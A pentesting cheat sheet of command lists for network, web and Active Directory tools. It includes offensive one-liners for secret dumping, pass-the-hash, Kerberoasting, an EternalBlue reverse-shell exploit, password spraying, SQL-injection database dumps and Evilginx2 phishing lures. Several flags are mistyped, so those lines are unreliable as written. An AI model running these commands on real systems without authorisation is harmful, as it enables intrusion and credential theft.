#### COMMAND LISTS

---
# WIRESHARK
Network protocol analyzer for: Traffic | Packets | Protocols | Forensics

### Workflow
1. Capture traffic (interface or file)
2. Apply display filters
3. Identify protocols and anomalies
4. Follow streams (TCP/HTTP)
5. Extract useful data (credentials, DNS, indicators)

```console
ip.addr == x.x.x.x                          - Shows all traffic to/from a specific IP address for host-level investigation
ip.addr >= x.x.x.x and ip.addr <= y.y.y.y   - Filters traffic within an IP range to analyze subnet activity

tcp.port == 80 or udp.port == 53            - Displays traffic on specific ports to isolate services like HTTP or DNS

frame.len > 100                             - Filters out very small packets to reduce noise and focus on meaningful traffic
frame.len > 1000                            - Highlights large packets which may indicate file transfers or data exfiltration

eth.src == xx:xx:xx:xx:xx:xx                - Filters traffic by MAC address to track specific devices on a network
// or eth.dst == xx:xx:xx:xx:xx:xx

http.response.code == 200                   - Shows successful HTTP responses to verify normal web activity
http.response.code == 404                   - Identifies missing resources which may indicate scanning or broken paths
http.request.method == "GET"                - Displays HTTP GET requests to observe normal browsing or automated requests
http.request.uri contains "example.com"     - Filters requests containing specific strings to track targeted activity
http.cookie contains "sessionid"            - Identifies session cookies which may be useful for session analysis or hijacking detection

tcp.flags.syn == 1                          - Shows SYN packets to identify connection attempts and potential scanning
tcp.stream eq 0                             - Reconstructs a full TCP conversation for deep inspection of a session
tcp.analysis.retransmission                 - Detects retransmissions which may indicate packet loss or unstable connections

dns.qry.name contains "example.com"         - Displays DNS queries for a domain to track resolution activity
dns.flags.response == 1                     - Shows DNS responses to analyze returned IPs
dns && !dns.flags.response                  - Filters only DNS requests to see what domains are being queried

tls.handshake.type == 1                     - Identifies TLS ClientHello packets to analyze encrypted session initiation

arp.opcode == 1                             - Shows ARP requests to identify devices discovering others on the network

icmp.type == 8 and icmp.code == 0           - Displays ICMP echo requests (ping) to identify probing activity
icmp.type == 0 and icmp.code == 0           - Displays ICMP echo replies to confirm responses from hosts

tcp                                         - Filters only TCP traffic to focus on connection-based communication
udp                                         - Filters only UDP traffic to analyze connectionless protocols
dns                                         - Filters only DNS traffic for domain resolution analysis
http                                        - Filters only HTTP traffic for web activity inspection

ip.src == x.x.x.x                           - Shows traffic originating from a specific source host
ip.dst == x.x.x.x                           - Shows traffic destined for a specific host
```
---

# HTTP Analysis

```console
http.response.code == 200               - Successful HTTP responses  
http.response.code == 404               - HTTP errors (missing resources)  
http.request.method == "GET"            - HTTP GET requests  

http.request.uri contains "example.com" - HTTP requests containing specific string  
http.cookie contains "sessionid"        - Packets containing specific cookie  
```
---

# TCP / Connection Analysis

```console              
tcp.flags.syn == 1          -SYN packets (connection attempts)  
tcp.stream eq 0             -Follow specific TCP stream  
tcp.analysis.retransmission -Detect retransmissions (network issues)  
```

---

# DNS Analysis

```console
dns.qry.name contains "example.com" - DNS queries for domain  
dns.flags.response == 1             - DNS responses  
dns && !dns.flags.response          - DNS requests only  
```

---

# TLS / Encryption

```console
tls.handshake.type == 1 - TLS ClientHello (initial handshake)  
```

---

# Network Protocol Filters

```console

tcp     - Show only TCP traffic  
udp     - Show only UDP traffic  
dns     - Show only DNS traffic  
http    - Show only HTTP traffic  
```

---

# ARP / ICMP

```console

arp.opcode == 1                     - ARP requests  
icmp.type == 8 and icmp.code == 0   -ICMP echo request (ping)  
icmp.type == 0 and icmp.code == 0   - ICMP echo reply  

```

---

# Directional Filtering
```console

ip.src == x.x.x.x       - Filter by source IP  
ip.dst == x.x.x.x      - Filter by destination IP  
```

### Notes
- Use filters incrementally to narrow results  
- Combine filters with `&&` and `||` for precision  
- Follow TCP streams to reconstruct sessions  
- Large packet sizes may indicate data exfiltration

---

# Burp Suite
Web application security testing platform / interception proxy
Used for:
- Proxying 
- Request Modification 
- Repeater Testing 
- Intruder Attacks 
- Manual Web App Analysis

### Workflow
1. Configure browser to use Burp proxy
2. Intercept requests
3. Send interesting requests to Repeater / Intruder
4. Analyze responses
5. Identify vulnerabilities manually

```console
burpsuite                                                    - Launch Burp Suite
Proxy -> Intercept on                                      - Intercept HTTP/S traffic in browser
Proxy -> HTTP history                                      - Review captured requests and responses
Right click request -> Send to Repeater                    - Send request to Repeater for manual testing
Right click request -> Send to Intruder                    - Send request to Intruder for fuzzing / brute force
Repeater -> Modify and Send                                - Manually test parameters and headers
Target -> Site map                                         - View discovered application structure
Scanner (Pro)                                              - Run automated vulnerability scan (Professional only)
Intruder -> Positions / Payloads / Start attack            - Launch targeted fuzzing attack
Comparer                                                   - Compare two requests or responses
Decoder                                                    - Encode / decode / hash data
```

### Notes
Burp Suite Community is strong for manual testing but lacks automated Scanner
HTTPS interception requires Burp CA certificate installed in browser
Best paired with ffuf, katana, and mitmproxy for web testing

# Gobuster
Fast content discovery / brute force tool

Used for: Directory Discovery | DNS Subdomain Bruteforce | Virtual Host Discovery

### Workflow
1. Choose mode (dir / dns / vhost)
2. Select target and wordlist
3. Filter useful responses
4. Expand findings manually
5..Export results

```console
gobuster dir -u https://target.com -w wordlist.txt                     - Directory / file discovery
gobuster dir -u https://target.com -w wordlist.txt -x php,txt,html     - Search with file extensions
gobuster dir -u https://target.com -w wordlist.txt -k                  - Skip TLS certificate verification
gobuster dir -u https://target.com -w wordlist.txt -s 200,204,301,302,403 - Show matching status codes
gobuster dir -u https://target.com -w wordlist.txt -b 404              - Exclude specific status code
gobuster dir -u https://target.com -w wordlist.txt -o gobuster.txt     - Save output to file
gobuster dns -d target.com -w subdomains.txt                           - DNS subdomain brute force
gobuster vhost -u https://target.com -w subdomains.txt                 - Virtual host brute force
```

###Notes
Great for fast content discovery when ffuf is overkill
Use a clean wordlist and pay attention to wildcard responses

# Dirsearch
Web content discovery tool
Used for: Hidden Directories | Files | Backup Files | Extension-Based Discovery

### Workflow
1. Select target
2. Pick wordlist / extensions
3. Filter noise
4. Review interesting hits
5. Export results

```console
dirsearch -u https://target.com                                        - Basic directory scan
dirsearch -u https://target.com -e php,txt,html                        - Scan with file extensions
dirsearch -u https://target.com -w wordlist.txt                        - Use custom wordlist
dirsearch -u https://target.com -x 403,404                             - Exclude status codes
dirsearch -u https://target.com --random-agent                         - Use random user agent
dirsearch -u https://target.com -o dirsearch.txt                       - Save results to file
dirsearch -l targets.txt                                               - Scan multiple targets from file
dirsearch -u https://target.com --recursive                            - Recursive directory scanning
```

### Notes
Similar role to Gobuster / ffuf

Useful when you want recursive discovery with clean output

# tcpdump
Command-line packet capture and network analysis tool

Used for: Packet Capture | Network Troubleshooting | Threat Hunting | Quick CLI Forensics

### Workflow
1. Identify interface
2. Capture traffic
3. Narrow with host / port / protocol filters
4. Save to PCAP if needed
5. Review in Wireshark if deeper analysis is needed
```console
tcpdump -D                                                              - List available network interfaces
tcpdump -i eth0                                                         - Capture traffic on interface
tcpdump -i eth0 host 192.168.1.10                                       - Capture traffic to/from a specific host
tcpdump -i eth0 src host 192.168.1.10                                   - Capture traffic from source host
tcpdump -i eth0 dst host 192.168.1.10                                   - Capture traffic to destination host
tcpdump -i eth0 port 80                                                 - Capture traffic on specific port
tcpdump -i eth0 tcp                                                     - Capture only TCP traffic
tcpdump -i eth0 udp                                                     - Capture only UDP traffic
tcpdump -i eth0 icmp                                                    - Capture only ICMP traffic
tcpdump -i eth0 -nn                                                     - Disable name and service resolution
tcpdump -i eth0 -c 100                                                  - Capture only first 100 packets
tcpdump -i eth0 -w capture.pcap                                         - Write capture to PCAP file
tcpdump -r capture.pcap                                                 - Read packets from saved PCAP file
tcpdump -i eth0 'port 53 or port 80 or port 443'                        - Capture DNS / HTTP / HTTPS traffic
```

# Notes
Use -nn often to keep output fast and readable

tcpdump is ideal for quick CLI capture; Wireshark is better for deep analysis

# Impacket
- Collection of Python tools for interacting with Windows / SMB / Active Directory
- Used for: Remote Execution | Credential Attacks | SMB Enumeration | Kerberos Abuse | Lateral Movement

### Workflow
1. Identify Windows / AD target
2. Choose correct Impacket script
3. Provide creds / hashes / tickets
4. Execute action
5. Validate results and pivot carefully
```console
impacket-psexec DOMAIN/user:password@192.168.1.10                       - Execute commands via PsExec-style service creation
impacket-wmiexec DOMAIN/user:password@192.168.1.10                      - Execute commands via WMI
impacket-smbexec DOMAIN/user:password@192.168.1.10                      - Execute commands via SMB service method
impacket-secretsdump DOMAIN/user:password@192.168.1.10                  - Dump SAM / LSA / NTDS secrets (privileged access required)
impacket-lookupsid DOMAIN/user:password@192.168.1.10                    - Enumerate SIDs and mapped accounts
impacket-GetNPUsers DOMAIN/ -usersfile users.txt -dc-ip 192.168.1.10 -no-pass -request -format hashcat -outputfile asrep.txt - AS-REP roasting against users without preauth
impacket-GetUserSPNs DOMAIN/user:password -dc-ip 192.168.1.10 -request  - Kerberoast service accounts
impacket-smbclient DOMAIN/user:password@192.168.1.10                    - Connect to SMB shares
impacket-rpcdump @192.168.1.10                                          - Dump RPC endpoints
impacket-mssqlclient DOMAIN/user:password@192.168.1.10                  - Connect to MSSQL server
impacket-atexec DOMAIN/user:password@192.168.1.10                       - Execute commands through Task Scheduler
impacket-psexec -hashes LMHASH:NTHASH DOMAIN/user@192.168.1.10          - Pass-the-hash execution
```
### Notes
Exact script names vary by install method; some environments use psexec.py, wmiexec.py, etc.

Many Impacket actions require valid credentials, hashes, or elevated privileges

One of the most important toolsets for Windows / AD work

# BloodHound
Active Directory attack path mapping and privilege analysis tool

Used for: AD Enumeration | Attack Path Analysis | Privilege Escalation Mapping | Misconfiguration Discovery

### Workflow
1. Collect AD data from domain
2. Import data into BloodHound
3. Analyze attack paths and privileges
4. Identify shortest path to high-value targets
5. Validate findings manually
```console
bloodhound                                                           - Launch BloodHound GUI
bloodhound-python -d domain.local -u user -p password -ns 192.168.1.10 -c All - Collect AD data with bloodhound-python
bloodhound-python -d domain.local -u user -p password -dc dc.domain.local -c All - Collect from specific domain controller
bloodhound-python -d domain.local -u user -p password -c DCOnly       - Collect only DC-related data
bloodhound-python -d domain.local -u user -p password -c Session      - Collect session information only
bloodhound-python -d domain.local -u user -p password -c Group        - Collect group and membership data
bloodhound-python -d domain.local -u user -p password -c LocalAdmin   - Collect local admin relationships
neo4j console                                                         - Start Neo4j database manually (if needed)
# Upload generated ZIP / JSON into BloodHound GUI                      - Import collected data for graph analysis
# Search for "Shortest Paths to Domain Admins"                         - Built-in analysis query
# Search for "Find Principals with DCSync Rights"                      - Built-in privilege query
```
### Notes
BloodHound itself is the graph analysis tool; bloodhound-python is a common Linux collector

SharpHound is the common Windows collector
Excellent for understanding privilege paths in AD, but findings still need manual validation

# Nikto
Web server vulnerability scanner

Checks for: Misconfigurations | Dangerous Files | Outdated Software | Known Vulnerabilities

### Workflow
1. Identify target (NMAP)
2. Run baseline scan
3. Narrow Scope (ports, paths, tuning)
4. Export, Validate
```console
nikto -h http://192.168.1.10                - Perform a basic scan against the target web server
nikto -h http://example.com                 - Scan a website for common vulnerabilities
nikto -h http://example.com -ask no         - Prevents prompts (important for automation)
nikto -h http://example.com -p 8080         - Scan a specific port on the target server
nikto -h http://example.com -ssl            - Perform a scan using SSL
nikto -h http://example.com -Tuning 1       - Test only for interesting files
nikto -h http://example.com -Tuning 2       - Scan for misconfigurations
nikto -h http://example.com -Tuning 3       - Test for information disclosure vulnerabilities
nikto -h http://example.com -Tuning 4       - Scan for injection vulnerabilities
nikto -h http://example.com -o results.txt  - Save scan results to a file
nikto -h http://example.com -format html    - Export results in HTML format
nikto -h http://example.com -Display V      - Show verbose output during scanning
nikto -h http://example.com -timeout 10     - Set request timeout
nikto -h http://example.com -C all          - Check for interesting CGIs
nikto -h http://example.com -D a            - Check for all server software versions
nikto -h http://example.com -root /cms/     - Set the root path for testing
```

# Netexec
Replaces CrackMapExec.

SMB / LDAP / WinRM enumeration

Credential spraying

Lateral Movement

### Workflow
1. Identify Host (NMAP)
2. Check SMB/LDAP exposure
3. Test Credentials
4. Enumerate users/shares
5. Attempt privilege escalation
```console
nxc smb 192.168.1.10                                - Enumerate SMB information from the target
nxc smb 192.168.1.10 -u user -p pass -d DOMAIN      - 
nxc smb 192.168.1.10 -u admin -p password           - Authenticate to SMB using credentials
nxc smb 192.168.1.0/24 -u admin -p password         - Test credentials across a network range
nxc smb 192.168.1.10 -- shares                      - Enumerate available SMB shares
nxc smb 192.168.1.10 -- sessions                    - List active SMB sessions
nxc smb 192.168.1.10 -- users                       - Enumerate domain users
nxc smb 192.168.1.10 -- groups                      - Enumerate domain groups
nxc smb 192.168.1.10 -- pass-pol                    - Retrieve password policy
nxc smb 192.168.1.10 -u users.txt -p passwords.txt  - Perform credential spraying attack
nxc winrm 192.168.1.10 -u admin -p password         - Authenticate using WinRM
nxc rdp 192.168.1.10 -u admin -p password           - Test RDP authentication
nxc ldap 192.168.1.10 -u admin -p password          - Query LDAP information
nxc smb 192.168.1.10 -- local-auth                  - Authenticate using local credentials
nxc smb 192.168.1.10 -- kerberoast                  - Roast Kerberos SPNs (service principal names)
nxc smb 192.168.1.10 -- sam-dump                    - Dump the SAM (Security Account Manager) database (**REQUIRES ADMIN PRIVILEGES)
```

# Metasploit
Exploitation

Payload delivery

Post-exploitation

### Workflow
1. Find exploit (search)
2. Configure target
3. Set payload
4. Run exploit
5. Manage sessions
```console
msfconsole                                      - Launch the Metasploit Framework console
search exploit windows                          - Search for Windows exploits in the database
use exploit/windows/smb/ms17_010_eternalblue    - Select an exploit module
show options                                    - Display required options for the selected module
set RHOSTS 192.168.1.10                         - Set the target IP address
set LHOST 192.168.1.5                           - Set the local machine IP for reverse connection
set PAYLOAD windows/meterpreter/reverse_tcp     - Select payload for exploitation
set RPORT 445
set VERBOSE true
exploit                                         - Launch the exploit against the target
sessions                                        - List active sessions
sessions -i 1                                   - Interact with a specific session
background                                      - Send the current session to background
search type:auxiliary scanner                   - Search for scanning modules
use auxiliary/scanner/portscan/tcp              - Use a TCP port scanning module
back                                            - Exit the current module or context
```

# Hydra
Password brute-force tool for network services.
### Workflow
1. Identify login service (Nmap)
2. Gather usernames/passwords
3. Run Hydra
4. Validate hits
```console
hydra -I admin -P passwords.txt ssh://192.168.1.1               - Brute-force SSH login using a password list
hydra -l users.txt -P passwords.txt ftp://192.168.1.1           - Attempt FTP login using username and password lists
hydra -I admin -P passwords.txt http-get://192.168.1.1/login    - Test HTTP login authentication
hydra -I admin -P passwords.txt smb://192.168.1.1               - Attempt SMB login brute force
hydra -L users.txt -P passwords.txt rdp://192.168.1.1           - Perform brute-force attack against RDP login
hydra -I admin -P passwords.txt mysql://192.168.1.1             - Attempt MySQL login brute-force
hydra -I root -P passwords.txt oracle://192.168.1.1             - Brute-force Oracle Database authentication
hydra -I admin -P passwords.txt postgres://192.168.1.1          - Brute-force PostgreSQL authentication
hydra -I admin -P passwords.txt telnet://192.168.1.1            - Attempt Telnet login attack
hydra -I admin -P passwords.txt snmp://192.168.1.1              - Test SNMP authentication credentials
hydra -I admin -P passwords.txt smtp://192.168.1.1              - Test SMTP authentication credentials
hydra -I admin -P passwords.txt pop3://192.168.1.1              - Attempt POP3 email login brute force
hydra -I admin -P passwords.txt imap://192.168.1.1              - Attempt IMAP login brute force
hydra -I admin -P passwords.txt svn://192.168.1.1               - Brute-force SVN repository authentication
hydra -I admin -P passwords.txt -t 4 ssh://192.168.1.1          - Run Hydra with multiple parallel tasks
hydra -I admin -s ##                                            - Specify port when needed
```

# SQLMap
Automates SQL Injection explotation
### Workflow
1. Identify injectable parameter
2. Run basic scan
3. Increase level/risk
4. Enumerate DB
5. Dump data
```console
sqlmap -u "http://target.com/page?id=1"                     - Test the URL for SQL injection vulnerabilities
sqlmap -u "URL" -- dbs                                      - Enumerate available databases
sqlmap -u "URL" -D database_name -- tables                  - List tables inside a database
sqlmap -u "URL" -D database_name -T table_name -- columns   - List columns in a table
sqlmap -u "URL" -D database_name -T table_name -- dump      - Dump database table data
sqlmap -u "URL" -- current-db                               - Display the current database
sqlmap -u "URL" -- current-user                             - Display the current database user
sqlmap -u "URL" -- users                                    - Enumerate database users
sqlmap -u "URL" -- passwords                                - Retrieve password hashes from the database
sqlmap -u "URL" -- batch                                    - Run sqlmap automatically without prompts
sqlmap -u "URL" -- level=5 -- risk=3                        - Perform a deeper SQL injection test
sqlmap -u "URL" -- os-shell                                 - Attempt to spawn an OS shell
sqlmap -u "URL" -- threads=10                               - Increase the number of concurrent requests
sqlmap -u "URL" -- forms                                    - Automatically test a web form for SQL injection
sqlmap -r request.txt                                       - Test a custom HTTP request for SQL injection
sqlmap -u "URL" --cookie="PHPSESSID=xyz"                    - Required for authenticated testing
```

# NMAP
Network scanner for: Hosts | Ports | Services | OS detection
### Workflow
1. Discover hosts 
2. Scan ports 
3. Identify services 
4. Run scripts

```console
nmap -sn 192.168.1.0/24                 - Performs host discovery only (no ports), identifies which IPs respond on the network
nmap -sS 192.168.1.1                    - Sends SYN packets to detect open ports without completing handshake (stealthy, requires root)
nmap -sV 192.168.1.1                    - Probes open ports to identify service type and version (e.g., Apache 2.4.41)
nmap -p 1-65535 192.168.1.1             - Scans all 65,535 TCP ports instead of default top ports to ensure nothing is missed
nmap -A 192.168.1.1                     - Enables OS detection, version detection, script scanning, and traceroute in one aggressive scan
nmap -F 192.168.1.1                     - Scans only the most common ports (~100) for quick surface-level assessment
nmap -O 192.168.1.1                     - Attempts to fingerprint the target OS based on TCP/IP stack behavior (may be inaccurate)
nmap -sU 192.168.1.1                    - Scans UDP ports (slow), useful for discovering services like DNS, SNMP, NTP
nmap -sC 192.168.1.1                    - Runs default NSE scripts to identify common vulnerabilities and misconfigurations
nmap -Pn 192.168.1.1                    - Skips host discovery and assumes host is up (used when ICMP/ping is blocked)
nmap -sA 192.168.1.1                    - Sends ACK packets to map firewall rules and determine filtered vs unfiltered ports
nmap --top-ports 100 192.168.1.1        - Scans the 100 most common ports based on frequency for efficient recon
nmap -iL targets.txt                    - Reads multiple targets from a file and scans them sequentially
nmap -oN output.txt 192.168.1.1         - Saves scan results in human-readable format for later analysis
nmap -sS -sV -sC -O -oA full_scan 192.168.1.1   - Full recon scan: stealth scan + service versions + scripts + OS + all output formats
```

# Nuclei
Fast vulnerability scanner using templates (CVE-based).
### Workflow
1. Get targets
2. Update templates
3. Run scan
4. Filter severity
5. Export results
```console
nuclei -u https://example.com                           - Scan a single target for vulnerabilities
nuclei -1 targets.txt                                   - Scan multiple targets from a list
nuclei -u https://example.com -t templates/             - Run scan using specific templates
nuclei -update-templates                                - Update vulnerability templates database
nuclei -u https://example.com -severity critical, high  - Scan only high severity vulnerabilities
nuclei -u https://example.com -tags cve                 - Scan using CVE-related templates
nuclei -u https://example.com -o results.txt            - Save scan results to a file
nuclei -1 targets.txt -o output.txt                     - Scan multiple targets and export results
nuclei -u https://example.com -json                     - Export results in JSON format
nuclei -u https://example.com -silent                   - Show only vulnerable results
nuclei -u https://example.com -stats                    - Display scan statistics
nuclei -u https://example.com -rate-limit 50            - Limit requests per second
nuclei -- list-templates                                - List all available templates
nuclei -- severity info                                 - Scan for informational vulnerabilities
nuclei -w templates/custom.yaml                         - Run a scan with a custom template file
```

# SpiderFoot
OSINT automation tool
### Workflow
1. Start web UI
2. Add target
3. Select modules
4. Analyze results
```console
spiderfoot -l 127.0.0.1:5001                    - Start the SpiderFoot web interface locally
spiderfoot -s example.com                       - Scan a target domain for OSINT intelligence
spiderfoot -s 192.168.1.1                       - Gather intelligence about a specific IP address
spiderfoot -s example.com -m sfp_dnsresolve     - Resolve DNS records for the target
spiderfoot -s example.com -m sfp_subdomain      - Discover subdomains of the target
spiderfoot -s example.com -m sfp_whois          - Gather WHOIS information
spiderfoot -s example.com -m sfp_email          - Discover email addresses
spiderfoot -s example.com -m sfp_pastebin       - Search for leaked data in Pastebin
spiderfoot -s example.com -m sfp_social         - Discover social media accounts
spiderfoot -s example.com -o results.csv        - Export scan results to CSV file
spiderfoot -s example.com -o results. json      - Export scan results to JSON format
spiderfoot -s example.com -f                    - Force a scan even if target is not a domain/IP
spiderfoot -s example.com -i                    - Run scan interactively with prompts
spiderfoot -V                                   - Show current SpiderFoot version
spiderfoot -h                                   - Display help and available command options
```

# BeEF
Browser Exploitation Framework
### Workflow
1. Start server
2. Hook browser
3. Execute modules
### CONCEPTS; NOT COMMANDS
```console
beef-xss                        - Start the BeEF framework server
http://127.0.0.1:3000/ui/panel  -Access the BeEF control panel
hook. js                        - JavaScript hook used to connect a victim browser to BeEF
Hook Browser                    - Connect a target browser to the BeEF framework
Command Module                  - Execute exploitation modules on hooked browsers
Browser Details                 - Display information about the hooked browser
Network Module                  - Gather internal network information from the target
Get Cookies                     - Extract cookies from the hooked browser
Redirect Browser                - Redirect the hooked browser to another webpage
Fake Notification               - Display a fake alert or notification
Keylogger Module                - Capture keystrokes from the hooked browser
Screenshot Module               - Capture screenshots from the victim browser
Social Engineering              - Perform attacks to trick hooked users
Persistence                     - Maintain a connection to the victim browser
Database                        - Store and manage data from hooked browsers
```

# THE HARVESTER
OSINT tool for emails/domains.
### Workflow
1. Choose source
2. Run scan
3. Expand DNS
4. Export results
```console
theHarvester -d example.com -b google                   - Gather emails and subdomains from Google
theHarvester -d example.com -b bing                     - Collect OSINT data from Bing search engine
theHarvester -d example.com -b yahoo                    - Discover emails and domains using Yahoo
theHarvester -d example.com -b linkedin                 - Gather employee information from Linkedin
theHarvester -d example.com -b twitter                  - Search Twitter for related accounts
theHarvester -d example.com -b github                   - Find related GitHub repositories or users
theHarvester -d example.com -b all                      - Use all available data sources
theHarvester -d example.com -b google -l 200            - Increase result limit to gather more data
theHarvester -d example.com -b bing -f results.html     - Save results to an HTML file
theHarvester -d example.com -b google -v                - Enable verbose output
theHarvester -d example.com -b google -n                - Perform DNS brute-force lookup
theHarvester -d example.com -b google -c                - Perform DNS reverse lookup
theHarvester -d example.com -b google -p                - Verify IP address ownership via ARIN/RIPE
theHarvester -h                                         - Display help information for commands
theHarvester -d example.com -b google -j results.json   - Save results to a JSON file
```

# SHODAN
Search engine for exposed internet devices
### Workflow
1. Search services
2. Filter results
3. Investigate targets
```console
shodan search apache        - Search for servers running Apache
shodan host 8.8.8.8         - Display information about a specific IP address
shodan myip                 - Show your current public IP address
shodan count nginx          - Count results matching a search query

# Search Filters
port: 22                    - Find devices running SSH on port 22
port : 21                   - Search for FTP servers
country: US apache          - Find Apache servers located in the United States
org:"Amazon.com"            - Search devices belonging to Amazon
product:nginx               - Find devices running Nginx
hostname: example. com      - Search for devices with a specific hostname
net:192.168.1.0/24          - Search within a specific network range
os: "Windows 10"            - Search devices running a specific operating system
city:Berlin                 - Find devices located in Berlin, Germany
shodan info                 - Display information about your Shodan API key
shodan scan example. com    - Scan a specific host using Shodan
```

# MALTEGO
Graph-based OSINT investigation tool.
### Workflow
1. Add entity
2. Run transforms
3. Analyze graph
```console
New Graph                   - Create a new investigation graph workspace
Add Entity                  - Add a target such as domain, email, IP address or person
Run Transform               - Execute transforms to gather intelligence about the entity
Domain to DNS Name          - Discover DNS records related to a domain
Domain to Website           - Identify websites associated with a domain
Domain to Email Address     - Find email addresses linked to a domain
IP Address to Location      - Discover geographical location of an IP
Person to Social Network    - Find social media profiles of a person
Email Address to Domain     - Identify domains linked to an email
Netblock to IP Addresses    - Enumerate IP addresses within a network range
Machine to DNS Name         - Resolve hostnames for a machine
Transform Hub               - Install additional transforms and integrations
Import Data                 - Load data from external files into the graph
Collaboration               - Share and collaborate on graphs with other users
Layouts                     - Apply different visual layouts to organize the graph
```

# AMASS
# Advanced sundomain enumeration

### Workflow
# Passive scan
# Active scan
# Visualize results
# Track changes

amass enum -d example.com                       - Perform subdomain enumeration for a domain
amass enum -passive -d example.com              - Passive subdomain enumeration using public sources
amass enum -active -d example.com               - Active enumeration including DNS brute forcing
amass enum -brute -d example.com                - Perform brute-force subdomain discovery
amass enum -src -d example.com                  - Show sources of discovered subdomains
amass enum -o subdomains.txt -d example.com     - Save discovered subdomains to a file
amass intel -d example.com                      - Gather intelligence about a domain
amass intel -whois -d example.com               - Retrieve WHOIS information about the domain
amass viz -d3 -d example.com                    - Generate a network visualization graph
amass track -d example.com                      - Track changes in discovered assets over time
amass db -list                                  - List all enumerations stored in the database
amass db -names                                 - List discovered subdomain names from the database
amass db -show                                  - Display details of a specific enumeration session
amass enum -config config.ini -d example.com    - Run enumeration with a custom configuration file
amass db -summary                               - Show summary of discovered information from the database

# WPScan
# Wordpress Vulnerability Scanner

### Workflow
# Detect WordPress
# Enumerate users/plugins
# Check vulnerabilities
# Attempt credentials

wpscan --url https://example.com                                   - Perform a basic scan on a WordPress site
wpscan --url https://example.com -- enumerate u                    - Enumerate WordPress users
wpscan --url https://example.com -- enumerate p                    - Enumerate installed plugins
wpscan --url https://example.com -- enumerate t                    - Enumerate installed themes
wpscan --url https://example.com -- enumerate vp                   - Enumerate vulnerable plugins
wpscan --url https://example.com -- enumerate vt                   - Enumerate vulnerable themes
wpscan --url https://example.com -- plugins-detection aggressive   - Perform aggressive plugin detection
wpscan --url https://example.com -- api-token YOUR_TOKEN           - Use WPScan vulnerability database API
wpscan --url https://example.com -U users.txt -P passwords.txt     - Perform WordPress login brute force
wpscan --url https://example.com -- passwords rockyou.txt          - Attempt password attack using wordlist
wpscan --url https://example.com -- random-user-agent              - Use random user agents during scanning
wpscan --url https://example.com -- force                          - Force scan even if target is not detected as WordPress
wpscan --url https://example.com -- enumerate ap                   - Enumerate all plugins (even not vulnerable)
wpscan --url https://example.com -- enumerate at                   - Enumerate all themes (even not vulnerable)
wpscan --url https://example.com -- enumerate tt                   - Enumerate timthumbs

# httpx
# Probes web servers and finds live hosts
# Validates targets and identify accessible web infrastructure

### Workflow
# Provide target list
# Probe for live hosts
# Enrich results (status, title, tech)
# Filter useful targets
# Export results

httpx -l targets.txt                        - Probe live hosts from file
httpx -l targets.txt -status-code -title    - Show HTTP status and page title
httpx -l targets.txt -tech-detect           - Detect web technologies
httpx -l targets.txt -ip                    - Display IP address of hosts
httpx -l targets.txt -ports 80,443,8080     - Probe specific ports
httpx -l targets.txt -o live_hosts.txt      - Save results to file
httpx -l targets.txt -https                 - Probe HTTPS only
httpx -l targets.txt -timeout 10            - Set timeout value

# subfinder
Fast passive subdomain enumeration

Passive OSINT, discovers subdomains using multiple OSINT sources.

### Workflow
# Provide domain(s)
# Run passive enumeration
# Expand sources if needed
# Save results
# Pipe into probing tools (httpx)

subfinder -d target.com                         - Basic subdomain enumeration
subfinder -d target.com -o subs.txt             - Save results to file
subfinder -dL domains.txt                       - Enumerate multiple domains
subfinder -d target.com -silent                 - Silent mode output
subfinder -d target.com -sources crtsh,github   - Use specific sources
subfinder -d target.com -recursive              - Recursive enumeration
subfinder -d target.com -o subs.txt -ip         - Output with IP resolution
subfinder -d target.com | httpx                 - Enumerate and pipe to httpx

# naabu
# Fast port scanner
# Speed and Automation. Optimized for scanning large attack surfaces, integrates with nuclei and httpx.

### Workflow
# Provide target(s)
# Scan common or full port range
# Adjust rate if needed
# Save results
# Pipe into web probing (httpx)

naabu -host target.com                      - Scan common ports
naabu -host target.com -p -                 - Scan all ports
naabu -list targets.txt                     - Scan targets from file
naabu -host target.com -rate 1000           - Set scan rate (packets per second)
naabu -host target.com -o open_ports.txt    - Save results to file
naabu -host target.com -p 22,80,443         - Scan specific ports
naabu -host 192.168.1.0/24                  - Scan subnet range
naabu -host target.com | httpx              - Pipe results to httpx

# ffuf
# Web fuzzer for directory and parameter discovery
# Discover hidden directories, files, virtual hosts, parameters.
# Web application security testing and content discovery.

### Workflow
# Choose target endpoint
# Select wordlist
# Run fuzzing (dirs, params, vhosts)
# Filter useful responses
# Export results

ffuf -u https://target.com/FUZZ -w wordlist.txt                             - Directory fuzzing
ffuf -u https://target.com/FUZZ -w wordlist.txt -e .php,.txt,.html          - File extension fuzzing
ffuf -u https://target.com/page.php?FUZZ=test -w params.txt                 - Parameter fuzzing
ffuf -u https://target.com -H "Host: FUZZ.target.com" -w subdomains.txt     - Virtual host fuzzing
ffuf -u https://target.com/FUZZ -w wordlist.txt -mc 200,403                 - Match specific status codes
ffuf -u https://target.com/FUZZ -w wordlist.txt -o results.json             - Save output to file
ffuf -u https://target.com/FUZZ -w wordlist.txt -t 50                       - Set number of threads
ffuf -u https://target.com/FUZZ -w wordlist.txt -recursion                  - Recursive fuzzing

# Katana
# Web crawler, attack surface discovery
# Supports Javascript parsing, automatic form extraction, tool integration (nuclei).

### Workflow
# Provide target(s)
# Crawl site structure
# Enable JS parsing if needed
# Extract endpoints and parameters
# Pipe results into scanners (nuclei)

katana -u https://target.com                                    - Basic crawl of target
katana -u https://target.com -o endpoints.txt                   - Crawl and save output
katana -list targets.txt                                        - Crawl multiple targets from file
katana -u https://target.com -jc                                - Enable JavaScript crawling
katana -u https://target.com -d 5                               - Set crawl depth
katana -u https://target.com -ps                                - Extract URLs with parameters
katana -u https://target.com -silent                            - Silent mode output
katana -u https://target.com | nuclei -t ~/nuclei-templates/    - Crawl and pipe to nuclei

# Evilginx2
# Phishing framework for credential capture
# Man-in-the-middle, captures authentication credentials and session tokens.
# Uses reverse proxy techniques to intercept login traffic and analyze authentication flows

### Workflow
# Start Evilginx2
# Load and enable a phishlet (target service template)
# Configure domain + DNS properly
# Set external/public IP
# Generate lure (phishing link)
# Send to target (authorized testing only)
# Monitor captured sessions

evilginx                                    - Start Evilginx2 framework
phishlets                                   - Show available phishlets
phishlets enable example                    - Enable a specific phishlet
phishlets status                            - Verify enabled phishlets
config domain add phishing-domain.com       - Add base domain (required)
config domain phishing-domain.com           - Set active phishing domain
config ip YOUR_PUBLIC_IP                    - Set external/public IP address
config redirect_url https://example.com     - Redirect victim after login (optional)
lures create example                        - Create phishing lure
lures                                       - List all lures
lures get-url 0                             - Retrieve lure URL
sessions                                    - Show captured sessions
sessions 0                                  - View details of a specific session
exit                                        - Stop Evilginx2 framework

/ Requirements
Domain ownership required
